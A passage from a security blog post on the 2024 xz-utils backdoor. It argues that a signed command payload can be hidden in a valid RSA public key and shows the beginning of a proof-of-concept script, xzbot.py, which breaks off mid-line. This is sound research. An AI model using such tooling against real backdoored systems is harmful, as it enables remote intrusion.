<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>Putting an xz Backdoor Payload in a Valid RSA Key | rya.nc</title><meta name="viewport" content="width=device-width"><link rel="alternate" hreflang="en" href="https://rya.nc/xz-valid-n.html"><link rel="canonical" href="https://rya.nc/xz-valid-n.html"><link rel="apple-touch-icon" sizes="180x180" href="/899b8191021d6476/apple-touch-icon.png"><link rel="icon" sizes="48x48" href="/2c06c41698072474/favicon.ico"><link rel="icon" type="image/png" sizes="16x16" href="/240b263e747c0d41/favicon-16x16.png"><link rel="icon" type="image/png" sizes="32x32" href="/db98edd2820c5b77/favicon-32x32.png"><link rel="icon" type="image/svg+xml" sizes="any" href="/5259b6a331ee08f4/favicon.svg"><link href="https://rya.nc/feeds/all.atom" type="application/atom+xml" rel="alternate" title="rya.nc Atom Feed"><link href="https://rya.nc/feeds/all.rss" type="application/rss+xml" rel="alternate" title="rya.nc RSS Feed"><meta name="description" content="Last week, a backdoor was discovered in xz-utils. The backdoor processes commands sent using RSA public keys as a covert channel. In order to preventâ¦"><meta name="twitter:card" content="summary"><meta property="og:title" content="Putting an xz Backdoor Payload in a Valid RSA Key"><meta property="og:type" content="article"><meta property="og:url" content="https://rya.nc/xz-valid-n.html"><meta property="og:site_name" content="rya.nc"><meta property="og:description" content="Last week, a backdoor was discovered in xz-utils. The backdoor processes commands sent using RSA public keys as a covert channel. In order to prevent anyone else from using the backdoor, the threatâ¦"><meta property="og:image" content="https://rya.nc/4ad9410dcccb51f5/avatar3.png"><meta property="article:tag" content="rsa"><meta property="article:tag" content="ssh"><meta property="article:tag" content="exploit"><meta property="article:tag" content="security"><meta property="article:tag" content="cryptography"><meta property="article:published_time" content="2024-04-03T17:55:00+01:00"><meta name="referrer" content="unsafe-url"><style>.pgcssgp,td.linenos{-webkit-touch-callout:none;-webkit-user-select:none;user-select:none}.linenos a,[class^=pgcssc]>a{color:inherit}[class^=pgcssc]>a{text-decoration:underline dotted}.delimiter{font-size:0}.fixme{font-weight:700;color:#d9d9d9;font-style:normal}.highlight em,.highlighttable em,a:hover{text-decoration:underline}.code,.highlight pre,.highlighttable,code,td.linenos{background-color:#121212;border:solid 1px #292929}.code,.highlight pre,code{padding:0 .2em}pre.code{white-space:pre-wrap}.code,.linenos,code{font-family:ui-monospace,"Cascadia Code","Source Code Pro",Menlo,Consolas,"DejaVu Sans Mono",monospace;line-height:1.3}table.highlighttable{width:100%}.highlighttable{width:100%;line-height:1.3}.highlighttable tbody td,.highlighttable td{vertical-align:text-top;padding:0 .3em 0 0;border:0}.highlighttable .linenos{width:4ch;padding:0 .3em;text-align:right;border-right:solid 1px #292929}.highlight pre>code,.highlighttable td>code{background-color:transparent;white-space:pre-wrap;border:0;-webkit-box-decoration-break:clone;box-decoration-break:clone}.highlighttable .special td,.highlighttable :target td{background-color:#030!important}nav#pagination{text-align:center}#banner a,#pagination a.active{color:#d9d9d9}@media (max-width:720px){#ft_left{float:none!important}}@media (max-width:480px){footer#contentinfo{font-size:2.9vw}}#ft_left{float:left}#banner,#ft_right{text-align:right}#banner{height:122px;margin:2px 0;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAALgAAAB6AQAAAAAkaKTVAAAAAnRSTlMAAQGU/a4AAAHPSURBVHgBldABhoUJDAThpQHCf5WmAELd/1br8YwxNstfED7Q8s/b/LbqjqrueHpCS6ApSylle/rMro7sI6Nqmb19KAw0YSCkTG8fq+OqK6qunv421Rn9xqrq6aHsljaEAoTk9NGdKbvD7IqO89xO+Hg7DA1kmNyu38bRLA7j6W9DBVVdf7q95Vuh0AA5XV3dVQRxZ/U5PUDCT7SQ3K4m/t15+ttU1/XbKqqnNwVoPgGBUE7fZwV85pln5Vkf19ObApBJA4SEcrt1XR1VVqN6+tvwz49Hx709gRIKtOk2C6c7o+uw6nY6+4y3Z4Y0Qwn9eDP5X1edLVJHVff0t6nrr2ZVOR0CtGlT0gXa29cH3X26o7PDqp4OIbRpG9oBklz+d2dd0dvfpqoyqLuqq3s6hAILAIXScLo+Ko4iqGWf20OSkAkECKW5XVSN4ffO09/mfzTu6dAkAG2atGThdn1mVPXxmS3PeDuQGYB8aksmt4vOiL9zT3+bMqqiqq6qpxe2baHAzz1dHLury2pl3fX0kKFtUiANDeR0jWpNFXWrevrbVFFVXNF12NNbSkNaChRYOF1ZO45r0ZUdbweaDk1TSIHJ7WrjoI1L6mr29Jf9CxvmqbblUL1fAAAAAElFTkSuQmCC),url(/theme/img/6b0ecd68ef0246fc/hdr-760.jpg),url(data:image/webp;base64,UklGRjgDAABXRUJQVlA4ICwDAAAQIgCdASr4AnoAD8D+JaW78fFtEwOw3JDoiz9Me5jn7/7wH//5+3feTxqFBhwZULksgRJVsgC4X8pxaUV5iJCXmNkELqbfp7CJq+wbQTwbYVTiPEvnoDjlM/CGtgzaEvmpa+x8doMnjTpthhN043sQaSrTa1+EE0/YjI8DkF7GWHj+57q2bTtgP4p12qb1kjW1c4+B0eh5zIkDHzJ423l6zaH8gAAAAHPqDSGdjcXPoiJnsk1ktD1lr0+ZdQDchTdTiaktBicsdiidVX+wx2oG9vgI7ExlzX4NUbm/+v1hYBv0KkdPR6ABCDTMs//eMWJYFaJs1bn8+q/S+BS5R/U9msb6sqDlDycg6xBc1gKA38s4otNQKkt2uAD+4aTFxXXFNPcFj280cRyhoQ2g1JZa6PjpVOduwyz+JiU28s4AJNuLPsaAbTFd5A30jyiIsmuZaUzCtKSLP+Rg3KQFRwqgzXHsai9MwSNq8SgKF4mt0XXon2KBkycKWWDNzfi+/wtNU8AH/4SLGoAL/5/ubjwcQmhCObErH9Tuy84g1b+AOH9r8dNU9n60gLMKA4hi3gFIhekxIxPGrpwC+WsOMjqvNw3ZwY/8/IYXx7d0J7nl3K30wcoVpJ9w05uttH0mf/ULP6bR/6Y3JFeck8t8LIxdrulwUpVrf1r3HW3wkAYNA4AAav6PGVfzDcrlegcB5ykNx7ybj8xizOf0lWBNrUZsOtzdE3gpTAd28U6diM1npbgrJwAS+HT1V+3+XSLoctdzBlfk2SzZCf535FYW92htZKKkT2MkJFiR6ELeT+eCEado3rmk836us2NZ23fDLh8IbZy2eUf9BaPVe/IwdXe7NTRZmU80LU+9Ctubvhf6XGP9Tg84G2+FDBiq6NREy8+h1yFFhCz0NCC+o/pKrosqjI8uhBLHjSnBrkzbRk5O+7uCVcykCA7/c4TzL/2DAEJa5vexeZoxOLNFeU0omJUkjoemSoPoag4Q5vlI7L3zijNEgzEDw+hW9b91DVnsYaXt489SkGBYA8GD0iBB7EW5cEu65EvreaCi+dqbu8HCIksgT9YVqXPLiAAAAA==);border:0}#banner div{padding-right:1em}#banner p.name{font-size:1.666667em;margin:18px 18px 0 0}#banner p.name a,.article h2{font-size:1.5em}#banner p.title{font-size:1em;font-weight:400;margin:1em 18px 0 0}.inside{padding:.5em 1.5em}#wrap{max-width:760px;margin:0 auto;text-align:left}#content{float:left;width:100%;overflow:hidden;padding-top:2em}#contentinfo{clear:both;font-size:.8em;background-color:#191919;border:solid 1px #292929;margin-bottom:1em;padding:0 .8em}#menu{background-color:#d9d9d9;overflow:hidden;position:sticky;top:0;margin-bottom:-1em;z-index:1}#menu a{clear:left;text-decoration:none;display:inline-block;padding:.5em;font-weight:700;line-height:1;color:#000}#menu span:hover a.active:not(:hover){background-color:#d9d9d9;color:#000}#menu a.active,#menu a:hover,body{background-color:#000;color:#d9d9d9}.exec #icons a{background-image:none!important}#icons a{height:1.25em;padding:.375em;background-repeat:no-repeat;background-size:1.25em;background-position:center}#icons img,#icons svg{display:inline-block;height:1.25em;width:1.25em;border-radius:15%}#icons a span{height:1px;width:1px;position:absolute;overflow:hidden;top:-10px}*{margin:0;padding:0}body{font-size:16px;font-family:sans-serif;line-height:1.3em}table{border-collapse:collapse;empty-cells:hide}address,blockquote,dl,fieldset,form,h1,h2,h3,h4,h5,h6,label,ol,p,ul{margin:.5em 0}dd,ol,ul{margin-left:1em}a{text-decoration:none;color:#74f474}a img{border:0}html{overflow:-moz-scrollbars-vertical;overflow-y:scroll}.fll{float:left}.flr{float:right}.print,input[type=checkbox].spoiler{display:none}.invis{font-size:0}@media not all and (any-pointer:fine),(any-hover:none),print{span.abbr::before{content:attr(data-title)" ("}span.abbr::after{content:")"}}abbr,time{text-decoration:underline dotted;cursor:default}.postmeta a[href^="/tag/"]::before{content:"#"}.section{scroll-margin-top:2.75em}.section>.section{scroll-margin-top:2.585em}.section>.section>.section{scroll-margin-top:2.5em}.section>:first-child>a[rel=bookmark]{color:inherit;text-decoration:none}span:target{scroll-margin-top:2.5em;background-color:#030;margin:0-2px;border:solid 2px #030;-webkit-box-decoration-break:clone;box-decoration-break:clone}.article hr{border:solid #292929;border-width:1px 0 0}#pagination,.archive,.article{background-color:#191919;border:solid 1px #292929;-webkit-hyphens:auto;hyphens:auto;line-height:1.3;margin-bottom:1.5em}.archive div>p,.article div>p{margin-bottom:1em;margin-top:1em}.article li p:first-child{margin-top:0}.article li p:last-child{margin-bottom:0}.article li+li{margin-top:.2em}.article h1{padding:.5em 0 1em;border-bottom:solid 1px #292929;font-size:1.8em;font-weight:400;line-height:1.3}.article h3{font-size:1.17em}.article h4{font-size:1em}.archive .inside+.inside,table.footnote{border-top:solid 1px #292929}.archive .postmeta{padding-top:0}.article ol,.article ul{margin-left:1.4em;margin-bottom:1em}#pagination,.postmeta,footer{font-size:.9em}.postmeta{color:#0ea82a;margin:2.2222em 0 .5em}.call-to-action{margin:2em 0}.article blockquote{margin:0 1em;padding:1em;font-style:italic;font-synthesis:none;border:solid 1px #292929}blockquote>p{margin:0}blockquote>p+p{margin-top:1em}.breakall{word-break:break-all!important}.article table>caption,.article td{padding:.3em;border:solid 1px #292929}.article table>caption{text-align:center;font-weight:700;background-color:#292929}.article blockquote,.article td{background-color:#121212}.article table.footnote td{background-color:inherit;border:0;font-size:smaller}.article table.footnote td.label{padding-left:0}img.align-center{display:block;margin-right:auto;margin-left:auto}a.footnote-reference,sub,sup{font-size:70%;line-height:0;position:relative;vertical-align:baseline}a.footnote-reference,sup{top:-.4em}sub{bottom:-.3em}a.footnote-reference+a{position:relative;top:-3.5em}table.footnote{width:100%;border-collapse:separate;border-spacing:0;padding-top:.5em;margin-bottom:0;scroll-margin-top:2em}table.footnote~table.footnote{border-top:0;padding-top:inherit}table.footnote .label{vertical-align:top;width:1px;white-space:nowrap}table.footnote:target td+td{background-color:#121212;outline:solid 1px #292929}input[type=checkbox].spoiler+.spoiler,summary{cursor:pointer}.admonition{background-color:#121212;border:solid 1px #292929;padding:0 1em}.admonition .admonition-title{text-transform:uppercase;float:left;margin-right:1em;font-weight:700}.note .admonition-title::before{content:"ð "}.hint .admonition-title::before,.tip .admonition-title::before{content:"ð¡ "}.attention .admonition-title::before,.error .admonition-title::before,.important .admonition-title::before{content:"âï¸ "}.warning .admonition-title::before{content:"â ï¸ "}.caution .admonition-title::before,.danger .admonition-title::before{content:"ð¥ "}.spoiler{transition-duration:500ms;transition-property:background-color;transition-timing-function:ease-in-out}input[type=checkbox].spoiler:checked+.spoiler:hover,input[type=checkbox].spoiler:not(:checked)+.spoiler{background-color:inherit}input[type=checkbox].spoiler:checked+.spoiler{background-color:currentColor}[class^=pgcss]{color:#d9d9d9}.pgcssgi,[class^=pgcsss]{color:#99ad6a}[class^=pgcssc]{color:#888;font-style:italic}.pgcssgu,.pgcssnt,.pgcssow,[class^=pgcssk]{color:#8197bf}.pgcssgd,.pgcssil,[class^=pgcssm]{color:#cf6a4c}tr.pgcsshll>td{background-color:#030}.pgcssch{font-style:normal}.pgcssgr,.pgcssgt{background-color:#902020}.pgcssgh{color:#70b950}.pgcssni{color:#799d6a}.pgcssgo{color:#999}.pgcsscp{color:#8fbfdc}.pgcssnv,.pgcssvc,.pgcssvg,.pgcssvi{color:#c6b6ee}.pgcsskc,.pgcssna,.pgcssnb,.pgcssnc,.pgcssnd,.pgcssnf{color:#fad07a}.pgcsskt,.pgcssne,.pgcssnl{color:#ffb964}.pgcssgh,.pgcssgu{font-weight:700}</style><link rel="preload" href="/theme/css/8a6e10f536c7fda5/iosevka-ryanc-woff2.css" as="style"><script>try{new MutationObserver((function(t,e,n){for(;e=t.pop();)for(e=[].slice.call(e.addedNodes);n=e.pop();)"stylesheet"==n.rel&&n.onload&&!n.media&&(n.media="print")})).observe(document.head,{childList:1})}catch(e){}</script><link rel="stylesheet" href="/theme/css/8a6e10f536c7fda5/iosevka-ryanc-woff2.css" onload="this.media='all'"><script>!function(e,n,o,t){var r,i=o.origin+"/theme/img/6b0ecd68ef0246fc/hdr-760.jpg",a=new Image,c="complete",d="onDomLoaded",u="addEventListener",f=setTimeout,m=e.errorLog=[],l=function(o,t,r,i,a){i=[],a=function(){for(e[o]=f;o=i.shift();)f(o)},e[o]=i.push.bind(i),t.indexOf(n.readyState)>=0?a():e[u](r,a)},s=e.dispatchEvent.bind(e,new Event(7));e[u]("error",(function(e){m.push(e)})),l(d,[c,"loaded","interactive"],"DOMContentLoaded"),l("onDomComplete",[c],"load"),l("onHeader",[c],7),e.loadJS=function(e,o,t){t="script",r=r||n.getElementsByTagName(t)[0],(t=n.createElement(t)).onload=o||"",t.src=e,r.parentNode.insertBefore(t,r)};n.documentElement.classList.add("exec"),(/^#\w+\/\w+$/.test(o.hash)||o.search&&!/^\/placeholder\b/.test(o.pathname))&&history.replaceState(null,"",o.pathname),/(Chrom|Firefox)/.test(t.userAgent)?(e[d]((function(){for(var e,o,t="background",r=t+"Image",i=0,d=n.styleSheets[0].cssRules;i<d.length;++i)if("#banner"==d[i].selectorText)return o=d[i].style,void(a[c]?s():((d=(e=o[r]).split(/,\s*(?=u)/)).splice(1,1),o[r]=d.join(","),a.onload=function(){o.transition=t+" 2s ease-in-out",o[r]=e,f(s,2100)}))})),a.src=i):s()}(window,document,location,navigator);</script></head><body itemscope itemtype="http://schema.org/WebSite"><div id="wrap"><header id="banner"><div class="inside"><p class="name" itemprop="name"><a href="/" itemprop="url">rya.nc</a></p><p class="title"><a href="/">Ryan Castellucciâs blog</a></p></div></header><nav id="menu"><span class="fll"><a href="/">Posts</a><a href="/about.html">About</a><a href="/contact.html">Contact</a></span><span class="flr" id="icons"><a href="https://infosec.exchange/@ryanc" rel="me" title="@ryanc@infosec.exchange" style="background-image:url('/theme/img/icon-Mastodon.png')"><span>my profile on Mastodon</span><svg xmlns="http://www.w3.org/2000/svg"><use xlink:href="/theme/img/95f64e8a26dbbe4d/icons.svg#Mastodon"></use></svg></a><a href="https://bsky.app/profile/rya.nc" rel="me" title="@rya.nc" style="background-image:url('/theme/img/icon-Bluesky.png')"><span>my profile on Bluesky</span><svg xmlns="http://www.w3.org/2000/svg"><use xlink:href="/theme/img/95f64e8a26dbbe4d/icons.svg#Bluesky"></use></svg></a><a href="https://github.com/ryancdotorg" rel="me" title="@ryancdotorg" style="background-image:url('/theme/img/icon-GitHub.png')"><span>my profile on GitHub</span><svg xmlns="http://www.w3.org/2000/svg"><use xlink:href="/theme/img/95f64e8a26dbbe4d/icons.svg#GitHub"></use></svg></a><a href="https://www.linkedin.com/in/ryancastellucci" rel="me" title="RyanCastellucci" style="background-image:url('/theme/img/icon-LinkedIn.png')"><span>my profile on LinkedIn</span><svg xmlns="http://www.w3.org/2000/svg"><use xlink:href="/theme/img/95f64e8a26dbbe4d/icons.svg#LinkedIn"></use></svg></a><a href="mailto:no_js_fwssupssnzukbsscxpssxne" title="email" style="background-image:url('/theme/img/icon-Email.png')" class="email"><span>email me</span><svg xmlns="http://www.w3.org/2000/svg"><use xlink:href="/theme/img/95f64e8a26dbbe4d/icons.svg#Email"></use></svg></a><a href="/feeds/all.xml" title="RSS Feed" style="background-image:url('/theme/img/icon-RSS.png')"><svg xmlns="http://www.w3.org/2000/svg"><use xlink:href="/theme/img/95f64e8a26dbbe4d/icons.svg#RSS"></use></svg></a></span></nav><section id="content"><div class="article inside" itemprop="mainEntity" itemscope itemtype="http://schema.org/BlogPosting"><link itemprop="mainEntityOfPage" href="https://rya.nc/xz-valid-n.html"><header><h1 class="entry-title" itemprop="headline"><a href="/xz-valid-n.html" rel="bookmark" title="Permalink to Putting an xz Backdoor Payload in a Valid RSA Key" itemprop="url"> Putting an xz Backdoor Payload in a Valid RSA Key </a></h1><meta itemprop="description" content="Last week, a backdoor was discovered in xz-utils. The backdoor processes commands sent using RSA public keys as a covert channel. In order to prevent anyone else from using the backdoor, the threatâ¦"><meta itemprop="image" content="https://rya.nc/4ad9410dcccb51f5/avatar3.png"></header><div class="entry-content" itemprop="articleBody"><p>Last week, <a class="external" href="https://arstechnica.com/security/2024/04/what-we-know-about-the-xz-utils-backdoor-that-almost-infected-the-world/">a backdoor was discovered</a> in <a class="external" href="https://en.wikipedia.org/wiki/XZ_Utils">xz-utils</a>. The backdoor processes commands sent using RSA public keys as a covert channel. In order to prevent anyone else from using the backdoor, the threat actor implemented a cryptographic signature check on the payload.</p><p>I have seen a number of people claim that this would necessarily result in an obviously invalid RSA public key, or at least one with no corresponding private key.</p><p>This is incorrect, and someone <a class="external" href="https://xkcd.com/356/">nerd sniped</a> me into proving it.</p><div class="highlight"><table class="highlighttable"><caption><a download href="/xz-valid-n_/attach/xzbot.py">xzbot.py</a></caption><tbody><tr><td class="linenos">1</td><td><code><span class="pgcssch">#!/usr/bin/env python3</span></code></td></tr><tr><td class="linenos">2</td><td></td></tr><tr><td class="linenos">3</td><td><code><span class="pgcssc1"># python standard library imports</span></code></td></tr><tr><td class="linenos">4</td><td><code><span class="pgcsskn">from</span> <span class="pgcssnn">os</span> <span class="pgcsskn">import</span> <span class="pgcssn">urandom</span></code></td></tr><tr><td class="linenos">5</td><td><code><span class="pgcsskn">from</span> <span class="pgcssnn">sys</span> <span class="pgcsskn">import</span> <span class="pgcssn">argv</span><span class="pgcssp">,</span> <span class="pgcssn">exit</span><span class="pgcssp">,</span> <span class="pgcssn">stderr</span></code></td></tr><tr><td class="linenos">6</td><td></td></tr><tr><td class="linenos">7</td><td><code><span class="pgcsskn">from</span> <span class="pgcssnn">hashlib</span> <span class="pgcsskn">import</span> <span class="pgcssn">sha256</span></code></td></tr><tr><td class="linenos">8</td><td><code><span class="pgcsskn">from</span> <span class="pgcssnn">base64</span> <span class="pgcsskn">import</span> <span class="pgcssn">b64decode</span> <span class="pgcssk">as</span> <span class="pgcssn">b64d</span></code></td></tr><tr><td class="linenos">9</td><td><code><span class="pgcsskn">from</span> <span class="pgcssnn">struct</span> <span class="pgcsskn">import</span> <span class="pgcssn">pack_into</span><span class="pgcssp">,</span> <span class="pgcssn">unpack_from</span></code></td></tr><tr><td class="linenos">10</td><td></td></tr><tr><td class="linenos">11</td><td><code><span class="pgcssc1"># third party imports</span></code></td></tr><tr><td class="linenos">12</td><td><code><span class="pgcsskn">from</span> <span class="pgcssnn">gmpy2</span> <span class="pgcsskn">import</span> <span class="pgcssn">mpz</span><span class="pgcssp">,</span> <span class="pgcssn">next_prime</span><span class="pgcssp">,</span> <span class="pgcssn">invert</span><span class="pgcssp">,</span> <span class="pgcssn">lcm</span><span class="pgcssp">,</span> <span class="pgcssn">gcd</span><span class="pgcssp">,</span> <span class="pgcssn">c_div</span></code></td></tr><tr><td class="linenos">13</td><td></td></tr><tr><td class="linenos">14</td><td><code><span class="pgcssc1"># i ain't 'fraid of no land mines, dragons, or dinosaurs with laser guns</span></code></td></tr><tr><td class="linenos">15</td><td><code><span class="pgcsskn">from</span> <span class="pgcssnn">cryptography.hazmat.primitives.asymmetric.rsa</span> <span class="pgcsskn">import</span> <span class="pgcssn">generate_private_key</span> <span class="pgcssk">as</span> <span class="pgcssn">rsa_generate</span></code></td></tr><tr><td class="linenos">16</td><td><code><span class="pgcsskn">from</span> <span class="pgcssnn">cryptography.hazmat.primitives.asymmetric.rsa</span> <span class="pgcsskn">import</span> <span class="pgcssn">RSAPrivateNumbers</span><span class="pgcssp">,</span> <span class="pgcssn">RSAPublicNumbers</span></code></td></tr><tr><td class="linenos">17</td><td><code><span class="pgcsskn">from</span> <span class="pgcssnn">cryptography.hazmat.primitives.asymmetric.ed448</span> <span class="pgcsskn">import</span> <span class="pgcssn">Ed448PrivateKey</span></code></td></tr><tr><td class="linenos">18</td><td></td></tr><tr><td class="linenos">19</td><td><code><span class="pgcsskn">from</span> <span class="pgcssnn">cryptography.hazmat.primitives.ciphers.algorithms</span> <span class="pgcsskn">import</span> <span class="pgcssn">ChaCha20</span></code></td></tr><tr><td class="linenos">20</td><td><code><span class="pgcsskn">from</span> <span class="pgcssnn">cryptography.hazmat.primitives.ciphers</span> <span class="pgcsskn">import</span> <span class="pgcssn">Cipher</span></code></td></tr><tr><td class="linenos">21</td><td></td></tr><tr><td class="linenos">22</td><td><code><span class="pgcsskn">from</span> <span class="pgcssnn">cryptography.hazmat.primitives.serialization</span> <span class="pgcsskn">import</span> <span class="pgcssn">PrivateFormat</span><span class="pgcssp">,</span> <span class="pgcssn">PublicFormat</span></code></td></tr><tr><td class="linenos">23</td><td><code><span class="pgcsskn">from</span> <span class="pgcssnn">cryptography.hazmat.primitives.serialization</span> <span class="pgcsskn">import</span> <span class="pgcssn">Encoding</span><span class="pgcssp">,</span> <span class="pgcssn">NoEncryption</span></code></td></tr><tr><td class="linenos">24</td><td><code><span class="pgcssc1"># End imports</span></code></td></tr><tr><td class="linenos">25</td><td></td></tr><tr><td class="linenos">26</td><td><code><span class="pgcssn">COMMAND</span> <span class="pgcsso">=</span> <span class="pgcssmi">2</span></code></td></tr><tr><td class="linenos">27</td><td><code><span class="pgcssn">RSA_BITS</span><span class="pgcssp">,</span> <span class="pgcssn">RSA_E</span> <span class="pgcsso">=</span> <span class="pgcssmi">2048</span><span class="pgcssp">,</span> <span class="pgcssn">mpz</span><span class="pgcssp">(</span><span class="pgcssmi">65537</span><span class="pgcssp">)</span></code></td></tr><tr><td class="linenos">28</td><td></td></tr><tr><td class="linenos">29</td><td><code><span class="pgcssc1"># splice data into a bytes-like value, returning a new `bytes` value</span></code></td></tr><tr><td class="linenos">30</td><td><code><span class="pgcssk">def</span> <span class="pgcssnf">replace_at</span><span class="pgcssp">(</span><span class="pgcssn">orig</span><span class="pgcssp">,</span> <span class="pgcssn">replace</span><span class="pgcssp">,</span> <span class="pgcssn">offset</span><span class="pgcssp">):</span></code></td></tr><tr><td class="linenos">31</td><td><code>    <span class="pgcssk">return</span> <span class="pgcssnb">bytes</span><span class="pgcssp">(</span><span class="pgcssn">orig</span><span class="pgcssp">[</span><span class="pgcssmi">0</span><span class="pgcssp">:</span><span class="pgcssn">offset</span><span class="pgcssp">]</span> <span class="pgcsso">+</span> <span class="pgcssn">replace</span> <span class="pgcsso">+</span> <span class="pgcssn">orig</span><span class="pgcssp">[</span><span class="pgcssn">offset</span><span class="pgcsso">+</span><span class="pgcssnb">len</span><span class="pgcssp">(</span><span class="pgcssn">replace</span><span class="pgcssp">):])</span></code></td></tr><tr><td class="linenos">32</td><td></td></tr><tr><td class="linenos">33</td><td><code><span class="pgcssc1"># integer to two's complement big endian value encoded as a `bytearray`</span></code></td></tr><tr><td class="linenos">34</td><td><code><span class="pgcssk">def</span> <span class="pgcssnf">int_to_bytearray</span><span class="pgcssp">(</span><span class="pgcssn">i</span><span class="pgcssp">):</span></code></td></tr><tr><td class="linenos">35</td><td><code>    <span class="pgcssn">i</span> <span class="pgcsso">=</span> <span class="pgcssnb">int</span><span class="pgcssp">(</span><span class="pgcssn">i</span><span class="pgcssp">)</span></code></td></tr><tr><td class="linenos">36</td><td><code>    <span class="pgcssn">i_bytes</span> <span class="pgcsso">=</span> <span class="pgcssn">i</span><span class="pgcsso">.</span><span class="pgcssn">to_bytes</span><span class="pgcssp">((</span><span class="pgcssn">i</span><span class="pgcsso">.</span><span class="pgcssn">bit_length</span><span class="pgcssp">()</span> <span class="pgcsso">+</span> <span class="pgcssmi">7</span><span class="pgcssp">)</span> <span class="pgcsso">//</span> <span class="pgcssmi">8</span><span class="pgcssp">,</span> <span class="pgcssn">byteorder</span><span class="pgcsso">=</span><span class="pgcsss1">'big'</span><span class="pgcssp">)</span></code></td></tr><tr><td class="linenos">37</td><td><code>    <span class="pgcssc1"># a leading zero byte is needed if first bit is 1</span></code></td></tr><tr><td class="linenos">38</td><td><code>    <span class="pgcssk">if</span> <span class="pgcssn">i_bytes</span><span class="pgcssp">[</span><span class="pgcssmi">0</span><span class="pgcssp">]</span> <span class="pgcsso">>=</span> <span class="pgcssmh">0x80</span><span class="pgcssp">:</span> <span class="pgcssn">i_bytes</span> <span class="pgcsso">=</span> <span class="pgcsssa">b</span><span class="pgcsss1">'</span><span class="pgcssse">\0</span><span class="pgcsss1">'</span> <span class="pgcsso">+</span> <span class="pgcssn">i_bytes</span></code></td></tr><tr><td class="linenos">39</td><td></td></tr><tr><td class="linenos">40</td><td><code>    <span class="pgcssk">return</span> <span class="pgcssnb">bytearray</span><span class="pgcssp">(</span><span class="pgcssn">i_bytes</span><span class="pgcssp">)</span></code></td></tr><tr><td class="linenos">41</td><td></td></tr><tr><td class="linenos">42</td><td><code><span class="pgcssc1"># newer versions of gmpy2 have this natively :-/</span></code></td></tr><tr><td class="linenos">43</td><td><code><span class="pgcssk">def</span> <span class="pgcssnf">mpz_from_bytes</span><span class="pgcssp">(</span><span class="pgcssn">b</span><span class="pgcssp">,</span> <span class="pgcssn">byteorder</span><span class="pgcsso">=</span><span class="pgcsss1">'big'</span><span class="pgcssp">,</span> <span class="pgcsso">*</span><span class="pgcssp">,</span> <span class="pgcssn">signed</span><span class="pgcsso">=</span><span class="pgcsskc">False</span><span class="pgcssp">):</span></code></td></tr><tr><td class="linenos">44</td><td><code>    <span class="pgcssk">return</span> <span class="pgcssn">mpz</span><span class="pgcssp">(</span><span class="pgcssnb">int</span><span class="pgcsso">.</span><span class="pgcssn">from_bytes</span><span class="pgcssp">(</span><span class="pgcssn">b</span><span class="pgcssp">,</span> <span class="pgcssn">byteorder</span><span class="pgcssp">,</span> <span class="pgcssn">signed</span><span class="pgcsso">=</span><span class="pgcssn">signed</span><span class="pgcssp">))</span></code></td></tr><tr><td class="linenos">45</td><td></td></tr><tr><td class="linenos">46</td><td><code><span class="pgcssc1"># random prime, n bytes long</span></code></td></tr><tr><td class="linenos">47</td><td><code><span class="pgcssk">def</span> <span class="pgcssnf">random_prime</span><span class="pgcssp">(</span><span class="pgcssn">n</span><span class="pgcssp">):</span></code></td></tr><tr><td class="linenos">48</td><td><code>    <span class="pgcssn">rand_bytes</span> <span class="pgcsso">=</span> <span class="pgcssn">urandom</span><span class="pgcssp">(</span><span class="pgcssn">n</span><span class="pgcssp">)</span></code></td></tr><tr><td class="linenos">49</td><td><code>    <span class="pgcssn">rand_start</span> <span class="pgcsso">=</span> <span class="pgcssn">mpz_from_bytes</span><span class="pgcssp">(</span><span class="pgcssn">rand_bytes</span><span class="pgcssp">)</span></code></td></tr><tr><td class="linenos">50</td><td><code>    <span class="pgcssk">return</span> <span class="pgcssn">next_prime</span><span class="pgcssp">(</span><span class="pgcssn">rand_start</span><span class="pgcssp">)</span> <span class="pgcssc1"># next <strong><span class="delimiter">*</span>probable<span class="delimiter">*</span></strong> prime</span></code></td></tr><tr><td class="linenos">51</td><td></td></tr><tr><td class="linenos">52</td><td><code><span class="pgcssc1"># construct rsa private key given (n, e, d, p, q)</span></code></td></tr><tr><td class="linenos">53</td><td><code><span class="pgcssk">def</span> <span class="pgcssnf">rsa_construct</span><span class="pgcssp">(</span><span class="pgcssn">n</span><span class="pgcssp">,</span> <span class="pgcssn">e</span><span class="pgcssp">,</span> <span class="pgcssn">d</span><span class="pgcssp">,</span> <span class="pgcssn">p</span><span class="pgcssp">,</span> <span class="pgcssn">q</span><span class="pgcssp">):</span></code></td></tr><tr><td class="linenos">54</td><td><code>    <span class="pgcssc1"># p should be greater than q</span></code></td></tr><tr><td class="linenos">55</td><td><code>    <span class="pgcssk">if</span> <span class="pgcssn">q</span> <span class="pgcsso">></span> <span class="pgcssn">p</span><span class="pgcssp">:</span> <span class="pgcssn">p</span><span class="pgcssp">,</span> <span class="pgcssn">q</span> <span class="pgcsso">=</span> <span class="pgcssn">q</span><span class="pgcssp">,</span> <span class="pgcssn">p</span></code></td></tr><tr><td class="linenos">56</td><td></td></tr><tr><td class="linenos">57</td><td><code>    <span class="pgcssc1"># compute chinese remainder theorem values</span></code></td></tr><tr><td class="linenos">58</td><td><code>    <span class="pgcssn">dmp1</span><span class="pgcssp">,</span> <span class="pgcssn">dmq1</span> <span class="pgcsso">=</span> <span class="pgcssnb">map</span><span class="pgcssp">(</span><span class="pgcssk">lambda</span> <span class="pgcssn">x</span><span class="pgcssp">:</span> <span class="pgcssnb">int</span><span class="pgcssp">(</span><span class="pgcssn">d</span> <span class="pgcsso">%</span> <span class="pgcssp">(</span><span class="pgcssn">x</span> <span class="pgcsso">-</span> <span class="pgcssmi">1</span><span class="pgcssp">)),</span> <span class="pgcssp">(</span><span class="pgcssn">p</span><span class="pgcssp">,</span> <span class="pgcssn">q</span><span class="pgcssp">))</span></code></td></tr><tr><td class="linenos">59</td><td><code>    <span class="pgcssn">iqmp</span> <span class="pgcsso">=</span> <span class="pgcssnb">int</span><span class="pgcssp">(</span><span class="pgcssn">invert</span><span class="pgcssp">(</span><span class="pgcssn">q</span><span class="pgcssp">,</span> <span class="pgcssn">p</span><span class="pgcssp">))</span></code></td></tr><tr><td class="linenos">60</td><td></td></tr><tr><td class="linenos">61</td><td><code>    <span class="pgcssc1"># build the key from parameters</span></code></td></tr><tr><td class="linenos">62</td><td><code>    <span class="pgcssn">n</span><span class="pgcssp">,</span> <span class="pgcssn">e</span><span class="pgcssp">,</span> <span class="pgcssn">d</span><span class="pgcssp">,</span> 